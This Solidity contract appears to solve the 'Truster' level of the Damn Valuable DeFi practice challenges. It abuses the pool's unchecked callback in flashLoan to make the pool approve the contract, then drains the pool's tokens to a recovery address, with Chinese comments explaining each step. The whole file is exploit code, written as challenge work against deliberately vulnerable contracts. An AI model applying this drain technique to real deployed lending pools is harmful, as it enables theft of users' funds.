// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract RescueContract {
    DamnValuableToken token;
    TrusterLenderPool pool;

    constructor(address _token, address _pool) {
        token = DamnValuableToken(_token);
        pool = TrusterLenderPool(_pool);
    }

    function rescue(address recovery, uint256 amount) public {
        // 执行闪电贷，并向本合约地址 approve
        bytes memory data = abi.encodeCall(token.approve, (address(this), amount));
        // 不借贷金额，直接执行低级调用
        pool.flashLoan(0, address(this), address(token), data);
        // pool -> 本合约
        token.transferFrom(address(pool), address(this), amount);
        // 本合约 -> recovery
        token.transfer(recovery, amount);
    }
}